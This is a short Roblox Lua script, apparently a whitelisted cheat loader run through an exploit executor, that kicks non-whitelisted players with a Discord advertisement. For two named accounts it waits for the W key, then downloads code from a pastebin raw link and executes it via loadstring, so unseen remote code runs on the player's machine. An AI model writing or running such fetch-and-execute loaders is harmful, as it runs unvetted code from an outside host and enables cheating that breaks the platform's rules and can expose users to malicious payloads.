_G.Name = game.Players.LocalPlayer.Name
if getgenv().isLoaded then return end
if _G.Name == "911hz" or _G.Name == "911hw" then
    game:GetService("UserInputService").InputBegan:connect(function(inputObject,gameProcessedEvent)
        if inputObject.KeyCode == Enum.KeyCode.W then
            if getgenv().isLoaded then return end
            print('you have been verified')
            loadstring(game:HttpGet("https://pastebin.com/raw/ntDzaSdL", true))()
            getgenv().isLoaded = true
        end
    end)
else
    game.Players.LocalPlayer:Kick("You are Not Whitelisted, Join the Discord Server (https://discord.gg/HZQE9kZbGx), or DM me on discord Clown#0130 or Phoze, zixnks#0001. Sorry!")
end
